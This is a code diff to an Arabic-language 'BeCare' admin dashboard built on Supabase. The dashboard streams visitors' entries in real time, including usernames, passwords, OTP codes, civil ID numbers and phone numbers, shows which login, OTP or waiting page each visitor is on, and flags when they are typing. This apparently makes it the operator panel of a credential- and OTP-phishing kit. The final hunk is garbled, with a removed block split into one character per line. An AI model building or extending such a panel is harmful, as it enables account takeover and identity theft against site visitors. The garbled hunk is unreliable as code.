@@ -220,15 +220,9 @@
 <!-- Supabase data layer: entries preview + journey cards -->
 <!-- Supabase data layer: username + id-last4 visible -->
 <!-- Supabase data layer: db view + entries + journey -->
+<!-- Supabase data layer: single clean build (fixed syntax) -->
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.49.4/dist/umd/supabase.min.js"></script>
 <script>
-// ---------------------------------------------------------------------------
-// BeCare Dashboard — Supabase data layer (realtime + admin login)
-// Replaces the localStorage demo layer. Same UI, same element IDs.
-// Requires: supabase-js v2 (UMD) loaded before this script, and the SQL setup
-// file (supabase_setup.sql) executed once in the Supabase SQL editor.
-// ---------------------------------------------------------------------------
-
 const SUPABASE_URL = 'https://gqcugugpigkfaihpaikt.supabase.co';
 const SUPABASE_KEY = 'sb_publishable_9XuOSJFbIz3mNBAibcPiDw_qUZzvYSf';
 
@@ -237,71 +231,403 @@ const noUserSelectedEl = document.getElementById('no-user-selected');
 const userDetailsHeader = document.getElementById('user-details-header');
 const userDetailsContent = document.getElementById('user-details-content');
 const headerStatsEl = document.getElementById('header-stats');
-
 const searchInput = document.querySelector('aside input[type="text"]');
 const filterPills = Array.from(document.querySelectorAll('aside .rounded-full'));
 const tabButtons = Array.from(document.querySelectorAll('aside .border-b button'));
 
 const sb = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-let selectedUserId = null;
-let allUsersData = [];
-let activeFilter = 'all';
-let activeTab = 'inbox';
-let liveChannel = null;
-let appStarted = false;
+let selectedUserId = null, allUsersData = [], activeFilter = 'all', activeTab = 'inbox', liveChannel = null, appStarted = false;
 
-// --- login gate -------------------------------------------------------------
+const FIELD_LABELS = { username: 'اسم المستخدم', 'demo-username': 'اسم المستخدم', password: 'كلمة السر', 'demo-password': 'كلمة السر', otp: 'رمز التحقق', code: 'رمز التحقق', 'demo-civil-1': 'رقم الهوية (جزء 1)', 'demo-civil-2': 'رقم الهوية (جزء 2)' };
+function fieldLabel(k) { return FIELD_LABELS[k] || k; }
+function fieldEntries(u) { return Object.entries(u.fields || {}).filter(([k, v]) => v && String(v).trim() !== ''); }
+function esc(s) { return String(s).replace(/[&<>"']/g, function (c) { return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]; }); }
+
+const PAGE_LABELS = [
+    [/customer-details/i, 'بيانات العميل'], [/access-username/i, 'صفحة الدخول'], [/access-password/i, 'كلمة المرور'],
+    [/access-verification/i, 'التحقق (OTP)'], [/access-waiting/i, 'صفحة الانتظار'], [/dashboard/i, 'لوحة المستخدم'],
+    [/becare/i, 'لوحة الإدارة'], [/test/i, 'اختبار']
+];
+function pageLabel(p) {
+    if (!p) return 'الرئيسية';
+    for (const [re, label] of PAGE_LABELS) if (re.test(p)) return label;
+    const c = String(p).replace(/\/+$/, '');
+    return (c === '' || /index\.html$/i.test(c)) ? 'الرئيسية' : c;
+}
+
 function ensureLoginGate() {
     if (document.getElementById('login-gate')) return;
     const gate = document.createElement('div');
     gate.id = 'login-gate';
     gate.className = 'fixed inset-0 z-[100] flex items-center justify-center bg-gradient-to-br from-green-700 via-green-600 to-emerald-500 p-4';
-    gate.innerHTML = `
-        <div class="bg-white rounded-2xl shadow-2xl w-full max-w-sm p-8 text-center">
-            <div class="w-14 h-14 bg-green-600 text-white rounded-2xl flex items-center justify-center text-2xl font-bold mx-auto mb-4">B</div>
-            <h1 class="text-xl font-extrabold text-gray-800 mb-1">لوحة تحكم BeCare</h1>
-            <p class="text-xs text-gray-500 mb-6">تسجيل دخول الإدارة — البيانات محمية عبر Supabase</p>
-            <form id="login-form" class="flex flex-col gap-3 text-right">
-                <input id="login-email" type="email" required placeholder="البريد الإداري" dir="ltr" class="border border-gray-200 rounded-lg px-3 py-2.5 text-sm focus:outline-none focus:ring-2 focus:ring-green-500">
-                <input id="login-password" type="password" required placeholder="كلمة المرور" dir="ltr" class="border border-gray-200 rounded-lg px-3 py-2.5 text-sm focus:outline-none focus:ring-2 focus:ring-green-500">
-                <p id="login-error" class="text-xs text-red-600 hidden text-right"></p>
-                <button type="submit" id="login-btn" class="bg-green-600 hover:bg-green-700 text-white font-bold rounded-lg py-2.5 text-sm transition">دخول</button>
-            </form>
-            <p class="text-[10px] text-gray-400 mt-4">البيانات تُحدَّث لحظيًا لكل زائر حقيقي في الموقع</p>
-        </div>`;
+    gate.innerHTML = '<div class="bg-white rounded-2xl shadow-2xl w-full max-w-sm p-8 text-center">'
+        + '<div class="w-14 h-14 bg-green-600 text-white rounded-2xl flex items-center justify-center text-2xl font-bold mx-auto mb-4">B</div>'
+        + '<h1 class="text-xl font-extrabold text-gray-800 mb-1">لوحة تحكم BeCare</h1>'
+        + '<p class="text-xs text-gray-500 mb-6">تسجيل دخول الإدارة — البيانات محمية عبر Supabase</p>'
+        + '<form id="login-form" class="flex flex-col gap-3 text-right">'
+        + '<input id="login-email" type="email" required placeholder="البريد الإداري" dir="ltr" class="border border-gray-200 rounded-lg px-3 py-2.5 text-sm focus:outline-none focus:ring-2 focus:ring-green-500">'
+        + '<input id="login-password" type="password" required placeholder="كلمة المرور" dir="ltr" class="border border-gray-200 rounded-lg px-3 py-2.5 text-sm focus:outline-none focus:ring-2 focus:ring-green-500">'
+        + '<p id="login-error" class="text-xs text-red-600 hidden text-right"></p>'
+        + '<button type="submit" id="login-btn" class="bg-green-600 hover:bg-green-700 text-white font-bold rounded-lg py-2.5 text-sm transition">دخول</button>'
+        + '</form><p class="text-[10px] text-gray-400 mt-4">البيانات تُحدَّث لحظيًا لكل زائر حقيقي في الموقع</p></div>';
     document.body.appendChild(gate);
-
     gate.querySelector('#login-form').addEventListener('submit', async (e) => {
         e.preventDefault();
         const errEl = gate.querySelector('#login-error');
         const btn = gate.querySelector('#login-btn');
         errEl.classList.add('hidden');
-        btn.disabled = true;
-        btn.innerText = 'جاري التحقق...';
+        btn.disabled = true; btn.innerText = 'جاري التحقق...';
         const email = gate.querySelector('#login-email').value.trim();
         const password = gate.querySelector('#login-password').value;
         const { error } = await sb.auth.signInWithPassword({ email, password });
-        btn.disabled = false;
-        btn.innerText = 'دخول';
+        btn.disabled = false; btn.innerText = 'دخول';
         if (error) {
-            const msg = /Invalid login credentials/i.test(error.message)
-                ? 'البريد الإلكتروني أو كلمة المرور غير صحيحة'
-                : /Email not confirmed/i.test(error.message)
-                    ? 'لم يتم تأكيد البريد الإلكتروني'
-                    : /provider/i.test(error.message)
-                        ? 'مزوّد البريد معطّل في Supabase — فعّل Email من Authentication → Providers'
-                        : (error.message || 'تعذر تسجيل الدخول');
-            errEl.innerText = msg;
-            errEl.classList.remove('hidden');
+            const msg = /Invalid login credentials/i.test(error.message) ? 'البريد الإلكتروني أو كلمة المرور غير صحيحة'
+                : /Email not confirmed/i.test(error.message) ? 'لم يتم تأكيد البريد الإلكتروني'
+                : /provider/i.test(error.message) ? 'مزوّد البريد معطّل في Supabase' : (error.message || 'تعذر تسجيل الدخول');
+            errEl.innerText = msg; errEl.classList.remove('hidden');
         }
     });
 }
-
 function showLogin() { ensureLoginGate(); document.getElementById('login-gate').classList.remove('hidden'); }
 function hideLogin() { const g = document.getElementById('login-gate'); if (g) g.classList.add('hidden'); }
 
-// --- live badge + sign out ---------------------------------------------------
+function toDate(v) { if (!v) return null; const d = new Date(v); return isNaN(d.getTime()) ? null : d; }
+function timeAgo(v) {
+    const d = toDate(v); if (!d) return 'الآن';
+    const s = Math.floor((Date.now() - d.getTime()) / 1000);
+    if (s < 60) return 'منذ ' + Math.max(1, s) + ' ثانية';
+    const m = Math.floor(s / 60); if (m < 60) return 'منذ ' + m + ' دقيقة';
+    const h = Math.floor(m / 60); if (h < 24) return 'منذ ' + h + ' ساعة';
+    return 'منذ ' + Math.floor(h / 24) + ' يوم';
+}
+function formatDateTime(v) {
+    const d = toDate(v); if (!d) return '';
+    const ampm = d.getHours() >= 12 ? 'pm' : 'am';
+    return ampm + ' ' + (d.getHours() % 12 || 12) + ':' + d.getMinutes().toString().padStart(2, '0') + ' | ' + d.getDate().toString().padStart(2, '0') + '-' + (d.getMonth() + 1).toString().padStart(2, '0');
+}
+function isOnline(u) {
+    if (u.isOnlineFlag === false) return false;
+    const d = toDate(u.lastSeen);
+    return !!(d && (Date.now() - d.getTime()) < 90000);
+}
+
+function mapVisitor(row) {
+    const F = row.fields || {};
+    const mapped = {
+        id: row.id, visitorId: row.visitor_id,
+        name: (row.name && row.name.trim()) ? row.name.trim() : 'زائر',
+        idNumber: (row.civil_id && row.civil_id.trim()) ? row.civil_id : '—',
+        phone: (row.phone && row.phone.trim()) ? row.phone : '—',
+        status: row.status || 'الرئيسية', shortId: row.short_id || '————',
+        hasDetails: !!((row.phone && row.phone.trim()) || (row.civil_id && row.civil_id.trim()) || (row.name && row.name.trim()) || (F && Object.keys(F).length > 0)),
+        archived: !!row.archived, createdAt: row.created_at, lastSeen: row.last_seen,
+        isOnlineFlag: row.is_online !== false, typing: row.is_typing === true,
+        deleted: !!row.deleted_at, deletedAt: row.deleted_at, fields: F, page: row.page || '',
+        username: F['demo-username'] || F['username'] || '',
+        civilRaw: ((F['demo-civil-1'] || '') + (F['demo-civil-2'] || '') + (F['civilId'] || '') + (row.civil_id || '')).replace(/\D/g, ''),
+        online: false
+    };
+    mapped.civilDisplay = mapped.civilRaw ? (mapped.civilRaw.length > 4 ? '••••' + mapped.civilRaw.slice(-4) : mapped.civilRaw) : '—';
+    mapped.online = isOnline(mapped);
+    return mapped;
+}
+
+function getVisibleUsers() {
+    const term = (searchInput && searchInput.value ? searchInput.value : '').trim().toLowerCase();
+    return allUsersData.filter((u) => {
+        if (u.deleted) return false;
+        if (activeTab === 'inbox' && u.archived) return false;
+        if (activeTab === 'archive' && !u.archived) return false;
+        if (activeFilter === 'online' && !u.online) return false;
+        if (activeFilter === 'leads' && !u.hasDetails) return false;
+        if (!term) return true;
+        const hay = [u.name, u.username, u.civilRaw, u.phone, (u.phone || '').slice(-4), u.shortId, u.status, u.page]
+            .concat(fieldEntries(u).map(([k, v]) => k + ' ' + v)).filter(Boolean).join(' ').toLowerCase();
+        return hay.includes(term);
+    });
+}
+
+function renderUsersList() {
+    const users = getVisibleUsers();
+    usersListEl.innerHTML = '';
+    if (!users.length) {
+        usersListEl.innerHTML = '<div class="p-6 text-center text-gray-400 text-xs leading-6">لا توجد زوار مطابقون.<br>افتح الموقع في تبويب آخر — ستظهر هنا لحظيًا.</div>';
+        return;
+    }
+    users.forEach((user) => {
+        const sel = selectedUserId === user.id;
+        const activeClass = sel ? 'active-user' : 'border-r-4 border-transparent hover:bg-gray-50';
+        let bg = 'bg-gray-500';
+        if (user.online) bg = 'bg-green-600';
+        else if (user.status === 'insurance' || user.status === 'verify') bg = 'bg-green-600';
+        else if (user.status === 'compare') bg = 'bg-orange-500';
+        else if (user.status === 'الرئيسية') bg = 'bg-gray-600';
+        const entries = fieldEntries(user);
+        const preview = entries.length
+            ? '<div class="mt-0.5 text-[10px] text-gray-600 bg-gray-50 rounded px-1.5 py-0.5 border" dir="auto">'
+                + entries.slice(0, 2).map(([k, v]) => '<span class="font-bold">' + fieldLabel(k) + ': ' + esc(v) + '</span>').join(' · ')
+                + '</div>'
+            : '';
+        const typingBadge = (user.typing && user.online)
+            ? '<div class="mt-0.5 text-[10px] text-orange-600 font-bold"><i class="fa-solid fa-pen fa-fade"></i> يكتب الآن</div>' : '';
+        const stateLabel = '<div class="text-[10px] font-bold ' + (user.online ? 'text-green-600' : 'text-gray-400') + '">'
+            + (user.online ? '● متصل الآن' : '○ غير متصل · ' + timeAgo(user.lastSeen)) + '</div>';
+        const item = document.createElement('div');
+        item.className = 'flex justify-between p-3 border-b cursor-pointer transition ' + activeClass;
+        item.onclick = () => selectUser(user.id);
+        item.innerHTML = '<div class="flex items-start gap-3 w-full">'
+            + '<div class="flex flex-col items-center gap-1 shrink-0">'
+            + '<div class="w-10 h-10 ' + bg + ' text-white rounded-full flex items-center justify-center font-bold text-lg shadow-sm"><i class="fa-solid fa-user"></i></div>'
+            + '<div class="flex items-center gap-1 text-[10px] text-gray-500"><span class="w-1.5 h-1.5 rounded-full ' + (user.online ? 'bg-green-500 animate-pulse' : 'bg-gray-300') + '"></span> ' + (user.status || '') + '</div>'
+            + '</div>'
+            + '<div class="flex-1 min-w-0">'
+            + '<div class="flex justify-between items-start"><h4 class="font-bold text-sm text-gray-800 truncate pl-2">' + esc(user.name) + '</h4>'
+            + '<span class="text-[10px] text-gray-400 whitespace-nowrap">' + timeAgo(user.createdAt) + '</span></div>'
+            + '<div class="mt-0.5 text-[11px] text-gray-500 flex items-center gap-2" dir="ltr"><span>' + (user.phone !== '—' ? esc(user.phone) : '') + '</span></div>'
+            + (user.username ? '<div class="mt-0.5 text-[10px] text-gray-600 font-bold"><i class="fa-solid fa-user-pen"></i> ' + esc(user.username) + '</div>' : '')
+            + (user.civilDisplay !== '—' ? '<div class="mt-0.5 text-[10px] text-gray-600"><i class="fa-solid fa-id-card"></i> آخر رقم من الهوية: <span dir="ltr">' + esc(user.civilDisplay) + '</span></div>' : '')
+            + '<div class="mt-0.5 text-[10px] text-gray-400 flex items-center gap-1"><i class="fa-solid fa-location-dot"></i> يتواجد في: ' + pageLabel(user.page) + '</div>'
+            + preview + typingBadge + stateLabel
+            + '</div>'
+            + '<div class="shrink-0 pt-1 text-gray-300"><i class="fa-regular ' + (sel ? 'fa-square-check text-green-500' : 'fa-square') + '"></i></div>'
+            + '</div>';
+        usersListEl.appendChild(item);
+    });
+}
+
+function updateStats() {
+    const active = allUsersData.filter((u) => !u.deleted);
+    const trashCount = allUsersData.length - active.length;
+    const trashBtn = document.getElementById('trash-btn');
+    if (trashBtn) trashBtn.innerHTML = '<i class="fa-solid fa-trash-can"></i> السلة (' + trashCount + ')';
+    const todayCount = active.filter((u) => { const d = toDate(u.createdAt); return d && (Date.now() - d.getTime()) < 86400000; }).length;
+    const onlineCount = active.filter(isOnline).length;
+    const leadsCount = active.filter((u) => u.phone !== '—').length;
+    const t = document.getElementById('stat-today'); if (t) t.innerText = String(todayCount);
+    const tt = document.getElementById('stat-total'); if (tt) tt.innerText = String(total || active.length);
+    const on = document.getElementById('stat-online'); if (on) on.innerText = String(onlineCount);
+    const ld = document.getElementById('stat-leads'); if (ld) ld.innerText = String(leadsCount);
+    const trio = document.getElementById('stat-trio'); if (trio) trio.innerHTML = '<span class="font-bold text-yellow-600">' + onlineCount + '</span> / <span class="font-bold text-green-600">' + leadsCount + '</span> / <span class="font-bold">' + active.length + '</span>';
+    const ib = tabButtons[0]; if (ib) ib.innerText = 'صندوق الوارد (' + active.filter(u => !u.archived).length + ')';
+}
+
+function selectUser(id) {
+    selectedUserId = id;
+    renderUsersList();
+    const user = allUsersData.find((u) => u.id === id);
+    if (!user) return;
+    noUserSelectedEl.classList.add('hidden');
+    userDetailsHeader.classList.remove('hidden');
+    userDetailsContent.classList.remove('hidden');
+    document.getElementById('detail-name').innerText = user.name;
+    document.getElementById('detail-id-short').innerHTML = user.shortId + ' <i class="fa-regular fa-copy cursor-pointer hover:text-green-600" onclick="window.copyToClipboard(\'' + user.shortId + '\')"></i>';
+    document.getElementById('detail-phone').innerText = user.phone;
+    document.getElementById('detail-id').innerText = user.idNumber;
+    const pageEl = document.getElementById('detail-page');
+    if (pageEl) pageEl.innerHTML = '<i class="fa-solid fa-location-dot"></i> يتواجد في: ' + pageLabel(user.page);
+    const typingEl = document.getElementById('detail-typing');
+    if (typingEl) typingEl.classList.toggle('hidden', !(user.typing && user.online));
+    document.getElementById('card-name').innerText = user.name;
+    document.getElementById('card-id').innerText = user.idNumber;
+    document.getElementById('card-phone').innerText = user.phone;
+    document.getElementById('card-doctype').innerText = user.docType || '—';
+    document.getElementById('card-serial').innerText = user.serial || '—';
+    document.getElementById('card-instype').innerText = user.insType || '—';
+    const cuEl = document.getElementById('card-username');
+    if (cuEl) cuEl.innerText = user.username || '—';
+    const ccEl = document.getElementById('card-civil');
+    if (ccEl) ccEl.innerText = user.civilDisplay;
+    let fieldsBox = document.getElementById('detail-fields');
+    if (!fieldsBox) {
+        const anchor = document.getElementById('card-instype');
+        if (anchor) {
+            const wrap = anchor.closest('div.flex.justify-between');
+            if (wrap && wrap.parentNode) {
+                fieldsBox = document.createElement('div');
+                fieldsBox.id = 'detail-fields';
+                fieldsBox.className = 'border-t border-dashed border-gray-200 pt-3 mt-1';
+                wrap.parentNode.appendChild(fieldsBox);
+            }
+        }
+    }
+    if (fieldsBox) {
+        const entries = fieldEntries(user);
+        fieldsBox.classList.toggle('hidden', entries.length === 0);
+        fieldsBox.innerHTML = entries.length
+            ? '<div class="text-xs font-bold text-gray-500 mb-2">إدخالات الزائر من صفحات الموقع</div>'
+                + entries.map(([k, v]) => '<div class="flex justify-between border-b border-dashed border-gray-200 pb-2 mb-2"><span class="text-gray-500 w-1/3">' + fieldLabel(k) + ':</span><span class="font-bold text-gray-900 w-2/3 text-left break-all" dir="auto">' + esc(v) + '</span></div>').join('')
+            : '';
+    }
+    let journeyBox = document.getElementById('detail-journey');
+    if (!journeyBox) {
+        const anchor = document.getElementById('card-instype');
+        if (anchor) {
+            const wrap = anchor.closest('div.flex.justify-between');
+            if (wrap && wrap.parentNode) {
+                journeyBox = document.createElement('div');
+                journeyBox.id = 'detail-journey';
+                journeyBox.className = 'border-t border-dashed border-gray-200 pt-3 mt-3';
+                wrap.parentNode.appendChild(journeyBox);
+            }
+        }
+    }
+    if (journeyBox) {
+        const GROUPS = [
+            { page: /access-username/i, title: 'صفحة الدخول', keys: ['demo-username', 'username', 'demo-civil-1', 'demo-civil-2'] },
+            { page: /access-password/i, title: 'كلمة المرور', keys: ['demo-password', 'password'] },
+            { page: /access-verification/i, title: 'التحقق (OTP)', keys: ['otp', 'code'] },
+            { page: /customer-details/i, title: 'بيانات العميل', keys: ['fullName', 'civilId', 'phone'] },
+            { page: /access-waiting/i, title: 'صفحة الانتظار', keys: [] }
+        ];
+        const f = user.fields || {};
+        let cards = '';
+        GROUPS.forEach((g) => {
+            const rows = g.keys.filter((k) => f[k] !== undefined && f[k] !== null && String(f[k]).trim() !== '')
+                .map((k) => '<div class="flex justify-between border-b border-dashed border-gray-100 pb-1.5 mb-1.5 last:mb-0">'
+                    + '<span class="text-gray-500 text-xs w-1/3">' + fieldLabel(k) + ':</span>'
+                    + '<span class="font-bold text-gray-900 text-xs w-2/3 text-left break-all" dir="auto">' + esc(f[k]) + '</span></div>').join('');
+            const onThis = new RegExp(g.page).test(user.page || '');
+            if (rows || onThis) {
+                cards += '<div class="rounded-xl border p-3 ' + (onThis ? 'border-green-300 bg-green-50/60' : 'border-gray-200 bg-white') + '">'
+                    + '<div class="flex items-center justify-between mb-2">'
+                    + '<span class="font-bold text-xs text-gray-700"><i class="fa-solid fa-file-lines"></i> ' + g.title + '</span>'
+                    + (onThis ? '<span class="text-[10px] bg-green-600 text-white px-2 py-0.5 rounded-full font-bold"><i class="fa-solid fa-location-dot"></i> الآن</span>' : '<span class="text-[10px] text-gray-400">مرّ منها</span>')
+                    + '</div>' + (rows || '<div class="text-[10px] text-gray-400">لم يُدخل بيانات هنا</div>') + '</div>';
+            }
+        });
+        journeyBox.classList.remove('hidden');
+        journeyBox.innerHTML = '<div class="text-xs font-bold text-gray-500 mb-2">رحلة الزائر عبر الصفحات — بيانات كل صفحة</div>'
+            + '<div class="grid gap-2">' + (cards || '<div class="text-[10px] text-gray-400">لا بيانات بعد</div>') + '</div>';
+    }
+    document.getElementById('detail-time').innerText = formatDateTime(user.lastSeen || user.createdAt);
+}
+
+async function fetchVisitors() {
+    const { data, error } = await sb.from('visitors').select('*').order('last_seen', { ascending: false }).limit(500);
+    if (error) { handleFetchError(error); return false; }
+    allUsersData = (data || []).map(mapVisitor);
+    return true;
+}
+function handleFetchError(error) {
+    const code = error.code || ''; const msg = error.message || '';
+    if (code === '42P01' || /does not exist/i.test(msg)) {
+        usersListEl.innerHTML = '<div class="p-5 text-center text-red-600 text-xs leading-6 bg-red-50 m-3 rounded-lg"><b>الجدول غير موجود بعد.</b><br>نفّذ supabase_setup.sql ثم أعد التحميل.</div>';
+    } else if (error.status === 401 || code === 'PGRST301') { showLogin(); }
+    else { window.showToast('خطأ: ' + msg); }
+}
+function subscribeRealtime() {
+    if (liveChannel) sb.removeChannel(liveChannel);
+    liveChannel = sb.channel('visitors-live')
+        .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'visitors' }, (msg) => {
+            const u = mapVisitor(msg.new);
+            if (!u.deleted && !allUsersData.some((x) => x.id === u.id)) {
+                allUsersData.unshift(u); updateStats(); renderUsersList();
+                window.showToast('زائر جديد دخل الآن: ' + u.name);
+            }
+        })
+        .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'visitors' }, (msg) => {
+            const u = mapVisitor(msg.new);
+            const i = allUsersData.findIndex((x) => x.id === u.id);
+            if (i >= 0) allUsersData[i] = u; else if (!u.deleted) allUsersData.unshift(u);
+            updateStats(); renderUsersList();
+            if (selectedUserId === u.id) selectUser(u.id);
+        })
+        .subscribe((status) => {
+            if (status === 'SUBSCRIBED') setLive('ok');
+            else if (status === 'CHANNEL_ERROR' || status === 'TIMED_OUT') setLive('err');
+            else setLive('wait');
+        });
+}
+
+function openTrashModal() {
+    let m = document.getElementById('trash-modal');
+    if (!m) {
+        m = document.createElement('div');
+        m.id = 'trash-modal';
+        m.className = 'fixed inset-0 z-[90] bg-black/40 flex items-center justify-center p-4';
+        m.innerHTML = '<div class="bg-white rounded-2xl shadow-2xl w-full max-w-lg max-h-[80vh] flex flex-col">'
+            + '<div class="flex items-center justify-between p-4 border-b"><h3 class="font-bold text-gray-800 text-sm"><i class="fa-solid fa-trash-can"></i> السلة — التسجيلات المحذوفة</h3>'
+            + '<button id="trash-close" class="text-gray-400 hover:text-gray-700 text-lg">✕</button></div>'
+            + '<div id="trash-list" class="flex-1 overflow-y-auto p-3 text-sm"></div>'
+            + '<div class="p-3 border-t flex items-center justify-between gap-2">'
+            + '<button id="restore-all" class="text-xs bg-blue-50 text-blue-600 px-3 py-2 rounded hover:bg-blue-100 font-bold">استعادة الكل</button>'
+            + '<button id="empty-trash" class="text-xs bg-red-50 text-red-600 px-3 py-2 rounded hover:bg-red-100 font-bold">إفراغ السلة نهائيًا</button></div></div>';
+        document.body.appendChild(m);
+        m.querySelector('#trash-close').onclick = () => m.classList.add('hidden');
+        m.addEventListener('click', (e) => { if (e.target === m) m.classList.add('hidden'); });
+        m.querySelector('#restore-all').onclick = async () => { await sb.rpc('restore_all_trash'); await fetchVisitors(); updateStats(); renderUsersList(); renderTrashList(); window.showToast('تمت الاستعادة'); };
+        m.querySelector('#empty-trash').onclick = async () => {
+            if (!window.confirm('حذف نهائي لكل محتويات السلة — متابعة؟')) return;
+            const { data: n } = await sb.rpc('empty_trash');
+            await fetchVisitors(); updateStats(); renderUsersList(); renderTrashList();
+            window.showToast('أُفرغت السلة (' + (n ?? 0) + ')');
+        };
+    }
+    m.classList.remove('hidden');
+    renderTrashList();
+}
+function renderTrashList() {
+    const listEl = document.getElementById('trash-list');
+    if (!listEl) return;
+    const items = allUsersData.filter((u) => u.deleted);
+    if (!items.length) { listEl.innerHTML = '<div class="text-center text-gray-400 text-xs py-8">السلة فارغة</div>'; return; }
+    listEl.innerHTML = '';
+    items.forEach((u) => {
+        const row = document.createElement('div');
+        row.className = 'flex items-center justify-between p-2.5 border-b border-gray-100';
+        row.innerHTML = '<div><div class="font-bold text-gray-800 text-xs">' + esc(u.name) + '</div><div class="text-[10px] text-gray-400">حُذف ' + timeAgo(u.deletedAt) + '</div></div>';
+        const btn = document.createElement('button');
+        btn.className = 'text-xs bg-blue-50 text-blue-600 px-2.5 py-1.5 rounded hover:bg-blue-100 font-bold';
+        btn.innerText = 'استعادة';
+        btn.onclick = async () => { await sb.rpc('restore_visitor', { p_id: u.id }); await fetchVisitors(); updateStats(); renderUsersList(); renderTrashList(); };
+        row.appendChild(btn);
+        listEl.appendChild(row);
+    });
+}
+
+if (searchInput) searchInput.addEventListener('input', renderUsersList);
+const FILTERS = ['all', 'online', 'leads'];
+filterPills.forEach((pill, index) => {
+    pill.addEventListener('click', () => {
+        activeFilter = FILTERS[index] || 'all';
+        filterPills.forEach((p, i) => {
+            p.className = (i === index) ? 'bg-green-600 text-white px-3 py-1 rounded-full cursor-pointer' : 'bg-gray-100 text-gray-600 px-3 py-1 rounded-full cursor-pointer hover:bg-gray-200';
+        });
+        renderUsersList();
+    });
+});
+tabButtons.forEach((btn, index) => {
+    btn.addEventListener('click', () => {
+        activeTab = index === 0 ? 'inbox' : 'archive';
+        tabButtons.forEach((b, i) => {
+            b.className = (i === index) ? 'flex-1 py-3 text-green-600 bg-white border-b-2 border-green-500' : 'flex-1 py-3 text-gray-500 hover:bg-gray-100 transition';
+        });
+        renderUsersList();
+    });
+});
+
+window.copyToClipboard = function (textOrId) {
+    const el = document.getElementById(textOrId);
+    const textToCopy = el ? el.innerText.trim() : textOrId;
+    const ta = document.createElement('textarea');
+    ta.value = textToCopy; ta.style.position = 'fixed'; ta.style.opacity = '0';
+    document.body.appendChild(ta); ta.select();
+    const done = () => { ta.remove(); window.showToast('تم النسخ!'); };
+    try {
+        if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(textToCopy).then(done).catch(() => { document.execCommand('copy'); done(); });
+        else { document.execCommand('copy'); done(); }
+    } catch (err) { ta.remove(); }
+};
+window.showToast = function (message) {
+    const toast = document.getElementById('toast');
+    if (!toast) return;
+    toast.innerText = message;
+    toast.classList.remove('translate-y-20', 'opacity-0');
+    setTimeout(() => toast.classList.add('translate-y-20', 'opacity-0'), 3000);
+};
+
 function ensureHeaderControls() {
     if (!document.getElementById('live-badge')) {
         const badge = document.createElement('span');
@@ -323,17 +649,15 @@ function ensureHeaderControls() {
         const del = document.createElement('button');
         del.id = 'delete-all-btn';
         del.className = 'text-xs bg-red-50 text-red-600 px-2 py-1 rounded hover:bg-red-100 transition';
-        del.title = 'حذف جميع التسجيلات ما عدا من أدخل تفاصيل العميل (اسم/هوية/جوال)';
+        del.title = 'نقل جميع التسجيلات إلى السلة ما عدا من أدخل تفاصيل العميل';
         del.innerHTML = '<i class="fa-solid fa-trash-can"></i> حذف جميع التسجيلات';
         del.onclick = async () => {
-            if (!window.confirm('سيتم نقل جميع التسجيلات إلى السلة ما عدا الزوار الذين أدخلوا تفاصيل العميل (اسم/هوية/جوال). متابعة؟')) return;
+            if (!window.confirm('سيتم نقل جميع التسجيلات إلى السلة ما عدا الزوار الذين أدخلوا تفاصيل العميل. متابعة؟')) return;
             del.disabled = true;
             const { data: moved, error } = await sb.rpc('trash_visitors');
             del.disabled = false;
             if (error) { window.showToast('تعذر النقل: ' + (error.message || '')); return; }
-            await fetchVisitors();
-            updateStats();
-            renderUsersList();
+            await fetchVisitors(); updateStats(); renderUsersList();
             window.showToast('نُقل ' + (moved ?? 0) + ' تسجيلًا إلى السلة');
         };
         headerStatsEl.appendChild(del);
@@ -356,1063 +680,22 @@ function ensureHeaderControls() {
         db.onclick = openDbModal;
         headerStatsEl.appendChild(db);
     }
- 
- 
- 
- 
-i
-f
- 
-(
-!
-d
-o
-c
-u
-m
-e
-n
-t
-.
-g
-e
-t
-E
-l
-e
-m
-e
-n
-t
-B
-y
-I
-d
-(
-'
-d
-b
--
-b
-t
-n
-'
-)
-)
- 
-{
-
-
- 
- 
- 
- 
- 
- 
- 
- 
-c
-o
-n
-s
-t
- 
-d
-b
- 
-=
- 
-d
-o
-c
-u
-m
-e
-n
-t
-.
-c
-r
-e
-a
-t
-e
-E
-l
-e
-m
-e
-n
-t
-(
-'
-b
-u
-t
-t
-o
-n
-'
-)
-;
-
-
- 
- 
- 
- 
- 
- 
- 
- 
-d
-b
-.
-i
-d
- 
-=
- 
-'
-d
-b
--
-b
-t
-n
-'
-;
-
-
- 
- 
- 
- 
- 
- 
- 
- 
-d
-b
-.
-c
-l
-a
-s
-s
-N
-a
-m
-e
- 
-=
- 
-'
-t
-e
-x
-t
--
-x
-s
- 
-b
-g
--
-i
-n
-d
-i
-g
-o
--
-5
-0
- 
-t
-e
-x
-t
--
-i
-n
-d
-i
-g
-o
--
-6
-0
-0
- 
-p
-x
--
-2
- 
-p
-y
--
-1
- 
-r
-o
-u
-n
-d
-e
-d
- 
-h
-o
-v
-e
-r
-:
-b
-g
--
-i
-n
-d
-i
-g
-o
--
-1
-0
-0
- 
-t
-r
-a
-n
-s
-i
-t
-i
-o
-n
-'
-;
-
-
- 
- 
- 
- 
- 
- 
- 
- 
-d
-b
-.
-t
-i
-t
-l
-e
- 
-=
- 
-'
-ق
-ا
-ع
-د
-ة
- 
-ا
-ل
-ب
-ي
-ا
-ن
-ا
-ت
- 
-—
- 
-ع
-ر
-ض
- 
-ج
-م
-ي
-ع
- 
-ا
-ل
-ت
-س
-ج
-ي
-ل
-ا
-ت
- 
-و
-ا
-ل
-إ
-د
-خ
-ا
-ل
-ا
-ت
-'
-;
-
-
- 
- 
- 
- 
- 
- 
- 
- 
-d
-b
-.
-i
-n
-n
-e
-r
-H
-T
-M
-L
- 
-=
- 
-'
-<
-i
- 
-c
-l
-a
-s
-s
-=
-"
-f
-a
--
-s
-o
-l
-i
-d
- 
-f
-a
--
-d
-a
-t
-a
-b
-a
-s
-e
-"
->
-<
-/
-i
->
- 
-ق
-ا
-ع
-د
-ة
- 
-ا
-ل
-ب
-ي
-ا
-ن
-ا
-ت
-'
-;
-
-
- 
- 
- 
- 
- 
- 
- 
- 
-d
-b
-.
-o
-n
-c
-l
-i
-c
-k
- 
-=
- 
-o
-p
-e
-n
-D
-b
-M
-o
-d
-a
-l
-;
-
-
- 
- 
- 
